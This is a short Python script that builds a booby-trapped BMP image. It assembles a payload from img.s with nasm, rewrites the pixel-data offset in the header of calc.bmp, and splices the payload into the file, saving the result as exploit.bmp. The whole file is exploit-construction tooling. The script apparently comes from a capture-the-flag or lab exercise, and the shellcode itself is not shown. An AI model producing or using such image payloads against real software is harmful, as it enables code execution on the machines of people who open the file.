import os
import struct
import tempfile

with tempfile.NamedTemporaryFile() as f_out:
    cmd = " ".join(["nasm", "-o", f_out.name, "img.s"])
    os.system(cmd)
    payload = f_out.read()

with open('calc.bmp', 'rb') as f:
    img = f.read()

orig = struct.unpack('I', img[0xa:0xa+4])[0]

exploit = img[:0xa] + struct.pack('I', 0xd8+len(payload)) + img[0xa+4:orig]
exploit = exploit.ljust(0xd8, b'\x00')
exploit += payload
exploit += img[orig:]

with open('exploit.bmp', 'wb') as f:
    f.write(exploit)
